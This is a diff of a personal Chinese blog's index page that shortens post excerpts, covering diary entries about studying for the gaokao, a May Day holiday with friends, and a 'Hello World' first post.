-<p>令自己诧异的是，近期睡觉前脑海里，总会出现一句话，告诉自己：“明天又是全心读书的一天！”</p>
-<p>这如是以前，唯一的想法是觉得“苦逼”。而近况，学习的动力却是源于这句话。</p>
-<p>一分耕耘一分收获，这是不可能的。而我期待的是那十分耕耘换来的一分收获</p>
-<p>晚安世界。</p>
-
-          
+          距离高考还有 ### 341天北京时间2017.07.01 02:00 a.m
+到底还是把数学试卷写完。自控力在紧张感愈加强大。
+最近的生活终于规矩了，压力感不断上升，可能是个疯子。
+重新体验到上课这久违的感觉，竟存在些许陌生。不闻窗外事，内心不断告诉自己，该努力该努力该努力了！！！
+令自己诧异的是
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/01/%E8%B7%9D%E7%A6%BB%E9%AB%98%E8%80%83%E8%BF%98%E6%9C%89..../#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -672,17 +581,18 @@ if($uid==$content)
       
         
           
-            <h3 id="日盼夜盼的五一假期。"><a href="#日盼夜盼的五一假期。" class="headerlink" title="日盼夜盼的五一假期。"></a>日盼夜盼的五一假期。</h3><p>现在凌晨1点了，也有了倦意，但还是想写完这篇小章再睡觉。</p>
-<p>本来这个假期，应该在家里多敲几行代码，或者完善一下Blog功能的。</p>
-<p>同样是00后，各找各的小伙伴玩去了，而我面对的，却是“这边的网站搭建好了吗”“有个bug你帮我修复一下”“我们的服务器宕机了处理一下”…</p>
-<p>面对的人，实实在在的少之又少，每天脸上戴着数十个面具，应付着种种笑脸。</p>
-<p>太多这些东西压在身上，很难有机会能够真正放松。</p>
-<p>到底还是放下了手中的任务，带上几个小朋友玩了一天。有朋自远方来，不亦乐乎？</p>
-<p>这种久违的感觉，太久没这么放松过了。也感到极其意外，与他们一起，自己能做到毫无防备，没什么可顾虑的。犹如独行于沙漠中，身边突然多了几位陪同者，而面具这个日常用品反而被丢弃在沙漠。</p>
-<p>圈子里，何人待我好待我差，我都铭记于心。始终看得透彻，我们不强求，喜则留，厌则走。挚友屈指可数，无需多，一二即满足。待他们无需戴面具，真真实实，没有目的，仅仅是走心。</p>
-<p>话多了，晚安，好久不见。</p>
-
-          
+          日盼夜盼的五一假期。现在凌晨1点了，也有了倦意，但还是想写完这篇小章再睡觉。
+本来这个假期，应该在家里多敲几行代码，或者完善一下Blog功能的。
+同样是00后，各找各的小伙伴玩去了，而我面对的，却是“这边的网站搭建好了吗”“有个bug你帮我修复一下”“我们的服务器宕机了处理一下”…
+面对的人，实实在
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/30/%E5%81%87%E6%9C%9F%EF%BC%8C%E5%8F%91%E5%8F%91%E7%89%A2%E9%AA%9A/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -800,12 +710,19 @@ if($uid==$content)
       
         
           
-            <h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><h3 id="程序员的世界里，每个程序员开始旅途的起点，便是“Hello-World”。"><a href="#程序员的世界里，每个程序员开始旅途的起点，便是“Hello-World”。" class="headerlink" title="程序员的世界里，每个程序员开始旅途的起点，便是“Hello World”。"></a>程序员的世界里，每个程序员开始旅途的起点，便是“Hello World”。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hello world</span><br></pre></td></tr></table></figure>
+          Hello World程序员的世界里，每个程序员开始旅途的起点，便是“Hello World”。1$ echo hello world
 
 
-<h3 id="我将“Hello-World”作为Blog的开始"><a href="#我将“Hello-World”作为Blog的开始" class="headerlink" title="我将“Hello World”作为Blog的开始"></a>我将“Hello World”作为Blog的开始</h3><p>希望这个开始所记录下来的能够给我带来数十年后的感动。</p>
-<h3 id="您好世界"><a href="#您好世界" class="headerlink" title="您好世界"></a>您好世界</h3>
+我将“Hello World”作为Blog的开始希望这个开始所记录下来的能够给我带来数十年后的感动。
+您好世界
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/29/hello-world/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
